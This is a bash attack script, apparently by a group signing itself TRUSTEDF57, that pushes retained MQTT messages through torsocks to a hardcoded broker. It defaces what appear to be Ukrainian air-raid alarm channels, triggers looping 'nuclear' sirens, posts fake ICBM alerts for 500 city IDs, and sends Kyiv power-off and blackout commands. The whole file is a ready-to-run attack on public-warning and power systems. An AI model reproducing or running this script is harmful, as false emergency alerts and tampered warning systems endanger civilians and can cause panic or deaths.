#!/bin/bash
BROKER="212.26.132.229"
PORT="1883"
DEFACE="TRUSTEDF57 GOVERNA MI FOTTO MARTHA ROOT"
HITS=0

echo "TRUSTEDF57 v8.0 - FAST MODE"

pkill -f torsocks >/dev/null 2>&1
sleep 1

# DELAY ANTI-BLOCK
DELAY=0.1

# PHASE 1 - DEFACE (batch 100 per volta)
echo "PHASE 1 DEFACE (batched)"
for batch in {1..5}; do
  for i in {1..100}; do
    ID=$(( (batch-1)*100 + i ))
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/$ID/status" -m "$DEFACE" -r >/dev/null 2>&1 &
    torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/$ID/alert" -m "$DEFACE" -r >/dev/null 2>&1 &
    sleep $DELAY
  done
  wait
  echo "Batch $batch/5 complete"
done
HITS=1000

# PHASE 2 - SIRENE (parallelo controllato)
echo "PHASE 2 SIRENE"
for i in {1..500}; do
  torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/$i/siren" -m '{"status":1,"sound":"nuclear","loop":true}' -r >/dev/null 2>&1 &
  sleep $DELAY
  if [ $((i % 50)) -eq 0 ]; then wait; fi
done
wait
HITS=$((HITS+500))

# PHASE 3 - NUCLEAR (veloce)
echo "PHASE 3 NUCLEAR"
for i in {1..500}; do
  CITY="C$(printf %03d $i)"
  torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_persistent/$i/NUCLEAR" -m "{\"type\":\"ICBM\",\"target\":\"$CITY\",\"f57\":true}" -r >/dev/null 2>&1 &
  sleep $DELAY
done
wait
HITS=$((HITS+500))

# CRITICAL POWER + CENTRAL
echo "PHASE 4 POWER + CENTRAL"
torsocks mosquitto_pub -h $BROKER -p $PORT -t "power/yasno_kyiv/status" -m '{"status":0,"OFF":"F57"}' -r >/dev/null 2>&1
torsocks mosquitto_pub -h $BROKER -p $PORT -t "power/emergency" -m '{"blackout":true}' -r >/dev/null 2>&1
torsocks mosquitto_pub -h $BROKER -p $PORT -t "ukrainealarm_central" -m "$DEFACE" -r >/dev/null 2>&1
torsocks mosquitto_pub -h $BROKER -p $PORT -t "emergency/all_cities" -m "{\"nuclear\":true,\"f57\":\"$DEFACE\"}" -r >/dev/null 2>&1
HITS=$((HITS+20))

echo "COMPLETE: $HITS HITS"
echo "CHECK: torsocks mosquitto_sub -h $BROKER -p $PORT -t 'ukrainealarm_persistent/+/#' -v"
